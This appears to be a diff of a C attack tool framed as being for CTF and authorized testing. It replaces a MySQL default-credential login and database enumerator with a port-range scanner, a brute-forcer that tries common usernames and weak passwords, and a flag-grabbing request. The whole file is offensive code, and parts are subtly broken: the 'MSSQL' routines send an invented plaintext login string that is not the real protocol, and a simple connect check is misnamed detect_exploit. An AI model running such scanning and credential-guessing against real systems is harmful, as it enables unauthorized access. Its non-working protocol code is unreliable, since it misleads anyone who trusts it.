@@ -1,22 +1,59 @@
+/*
+Enhances scanning, brute-forcing, and flag capture. For educational and authorized testing only.
+*/
+
 #include <stdio.h>
-#include <string.h>
 #include <stdlib.h>
-#include <mysql/mysql.h>
-#include <arpa/inet.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
+#include <string.h>
+#include <errno.h>
 #include <unistd.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <sys/socket.h>
 
-/* For authorized security testing and CTF purposes only */
+#define MAX_BUF 1024
 
-int scan_port(const char *host, int port) {
-    struct sockaddr_in serv_addr;
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) return 0;
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_port = htons(port);
-    inet_pton(AF_INET, host, &serv_addr.sin_addr);
-    if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
+int send_weak_mssql_data(const char *host, unsigned short port) {
+    int sock;
+    struct sockaddr_in server;
+    char buffer[MAX_BUF];
+    int n;
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if(sock < 0) return -1;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+    if(inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
+        close(sock);
+        return -2;
+    }
+    if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
+        close(sock);
+        return -3;
+    }
+    strcpy(buffer, "SQL_LOGIN sa no_password");
+    send(sock, buffer, strlen(buffer), 0);
+    memset(buffer, 0, sizeof(buffer));
+    n = recv(sock, buffer, sizeof(buffer)-1, 0);
+    if(n > 0) {
+        buffer[n] = '\0';
+        printf("MSSQL response: %s\n", buffer);
+    }
+    close(sock);
+    return 0;
+}
+
+int detect_exploit(const char *host, unsigned short port) {
+    int sock;
+    struct sockaddr_in target;
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if(sock < 0) return 0;
+    target.sin_family = AF_INET;
+    target.sin_port = htons(port);
+    if(inet_pton(AF_INET, host, &target.sin_addr) <= 0) {
+        close(sock);
+        return 0;
+    }
+    if(connect(sock, (struct sockaddr *)&target, sizeof(target)) < 0) {
         close(sock);
         return 0;
     }
@@ -24,88 +61,134 @@ int scan_port(const char *host, int port) {
     return 1;
 }
 
-int main() {
-    const char* user = "root";
-    const char* pass = "password";
-    printf("Connecting to MySQL with credentials: %s / %s\n", user, pass);
+char* capture_flag(const char *host, unsigned short port) {
+    static char flag[MAX_BUF];
+    int sock;
+    struct sockaddr_in srv;
+    char buffer[MAX_BUF];
+    int n;
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if(sock < 0) return NULL;
+    srv.sin_family = AF_INET;
+    srv.sin_port = htons(port);
+    if(inet_pton(AF_INET, host, &srv.sin_addr) <= 0) {
+        close(sock);
+        return NULL;
+    }
+    if(connect(sock, (struct sockaddr*)&srv, sizeof(srv)) < 0) {
+        close(sock);
+        return NULL;
+    }
+    send(sock, "GET_FLAG", 8, 0);
+    memset(buffer, 0, sizeof(buffer));
+    n = recv(sock, buffer, sizeof(buffer)-1, 0);
+    if(n > 0) {
+        buffer[n] = '\0';
+        strncpy(flag, buffer, MAX_BUF-1);
+    }
+    close(sock);
+    return flag;
+}
 
-    const char* host = "127.0.0.1";
-    int port = 3306;
-    if (!scan_port(host, port)) {
-        printf("MySQL port closed or filtered.\n");
+int scan_port_range(const char *host, unsigned short start_port, unsigned short end_port) {
+    int count = 0;
+    for(unsigned short p = start_port; p <= end_port; p++) {
+        if(detect_exploit(host, p)) {
+            printf("Port %d open on %s.\n", p, host);
+            count++;
+        }
+    }
+    return count;
+}
+
+int brute_force_mssql(const char *host, unsigned short port) {
+    const char *users[] = {"sa", "admin", "root"};
+    const char *passwords[] = {"", "1234", "password", "admin"};
+    int sock, n;
+    struct sockaddr_in server;
+    char buffer[MAX_BUF];
+    for(int i = 0; i < (int)(sizeof(users)/sizeof(users[0])); i++) {
+        for(int j = 0; j < (int)(sizeof(passwords)/sizeof(passwords[0])); j++) {
+            sock = socket(AF_INET, SOCK_STREAM, 0);
+            if(sock < 0) continue;
+            server.sin_family = AF_INET;
+            server.sin_port = htons(port);
+            if(inet_pton(AF_INET, host, &server.sin_addr) <= 0) {
+                close(sock);
+                continue;
+            }
+            if(connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
+                close(sock);
+                continue;
+            }
+            snprintf(buffer, sizeof(buffer), "SQL_LOGIN %s %s", users[i], passwords[j]);
+            send(sock, buffer, strlen(buffer), 0);
+            memset(buffer, 0, sizeof(buffer));
+            n = recv(sock, buffer, sizeof(buffer)-1, 0);
+            if(n > 0) {
+                buffer[n] = '\0';
+                printf("Attempt user: %s, pass: %s => %s\n", users[i], passwords[j], buffer);
+            }
+            close(sock);
+        }
+    }
+    return 0;
+}
+
+int main(int argc, char *argv[]) {
+    char data[] = "Sensitive MSSQL Data";
+    printf("Sending MSSQL data in a weakly protected way: %s\n", data);
+
+    if(argc < 3) {
+        printf("Usage:\n");
+        printf("  %s <IP> <PORT>\n", argv[0]);
+        printf("  %s <IP> range <START_PORT> <END_PORT>\n", argv[0]);
+        printf("  %s <IP> brute <PORT>\n", argv[0]);
+        return 1;
+    }
+
+    const char *ip = argv[1];
+
+    if(!strcmp(argv[2], "range") && argc == 5) {
+        unsigned short start_port = atoi(argv[3]);
+        unsigned short end_port   = atoi(argv[4]);
+        int found = scan_port_range(ip, start_port, end_port);
+        printf("Open ports found: %d\n", found);
         return 0;
     }
 
-    MYSQL *conn;
-    conn = mysql_init(NULL);
-    if (!conn) {
-        printf("mysql_init failed.\n");
-        return 1;
+    if(!strcmp(argv[2], "brute") && argc == 4) {
+        unsigned short port = atoi(argv[3]);
+        if(!detect_exploit(ip, port)) {
+            printf("Port %d closed or unreachable on %s.\n", port, ip);
+            return 0;
+        }
+        printf("Port %d open on %s. Starting brute force...\n", port, ip);
+        brute_force_mssql(ip, port);
+        return 0;
     }
-    if (!mysql_real_connect(conn, host, user, pass, NULL, port, NULL, 0)) {
-        printf("Connection failed: %s\n", mysql_error(conn));
-    } else {
-        printf("Connected.\n");
-        if (mysql_query(conn, "SELECT VERSION()")) {
-            printf("Version query error: %s\n", mysql_error(conn));
+
+    if(argc == 3) {
+        unsigned short port = atoi(argv[2]);
+        if(!detect_exploit(ip, port)) {
+            printf("Port %d closed or unreachable on %s.\n", port, ip);
+            return 0;
+        }
+        printf("Port %d open on %s.\n", port, ip);
+
+        if(send_weak_mssql_data(ip, port) == 0) {
+            printf("Weak MSSQL data sent.\n");
         } else {
-            MYSQL_RES *res = mysql_store_result(conn);
-            if (res) {
-                MYSQL_ROW row = mysql_fetch_row(res);
-                if (row) printf("MySQL Version: %s\n", row[0]);
-                mysql_free_result(res);
-            }
+            printf("Failed to send MSSQL data.\n");
         }
-        if (mysql_query(conn, "SHOW DATABASES")) {
-            printf("Error listing databases: %s\n", mysql_error(conn));
+
+        char *found_flag = capture_flag(ip, port);
+        if(found_flag && strlen(found_flag) > 0) {
+            printf("Captured flag: %s\n", found_flag);
         } else {
-            MYSQL_RES *res = mysql_store_result(conn);
-            if (res) {
-                MYSQL_ROW row;
-                while ((row = mysql_fetch_row(res))) {
-                    printf("DB Found: %s\n", row[0]);
-                }
-                mysql_free_result(res);
-            }
-        }
-        if (!mysql_select_db(conn, "mysql")) {
-            if (mysql_query(conn, "SHOW TABLES")) {
-                printf("Error listing tables: %s\n", mysql_error(conn));
-            } else {
-                MYSQL_RES *res = mysql_store_result(conn);
-                if (res) {
-                    MYSQL_ROW row;
-                    while ((row = mysql_fetch_row(res))) {
-                        printf("Table in 'mysql': %s\n", row[0]);
-                    }
-                    mysql_free_result(res);
-                }
-            }
-        }
-        /* Example of trying to retrieve a 'flag' table */
-        mysql_select_db(conn, "ctf");
-        mysql_query(conn, "SHOW TABLES LIKE 'flag'");
-        {
-            MYSQL_RES *res = mysql_store_result(conn);
-            if (res) {
-                if (mysql_num_rows(res) > 0) {
-                    mysql_free_result(res);
-                    if (!mysql_query(conn, "SELECT * FROM flag")) {
-                        MYSQL_RES *flagres = mysql_store_result(conn);
-                        if (flagres) {
-                            MYSQL_ROW flagrow;
-                            while ((flagrow = mysql_fetch_row(flagres))) {
-                                printf("Flag: %s\n", flagrow[0]);
-                            }
-                            mysql_free_result(flagres);
-                        }
-                    }
-                } else {
-                    mysql_free_result(res);
-                }
-            }
+            printf("No flag captured.\n");
         }
     }
-    mysql_close(conn);
+
     return 0;
 }
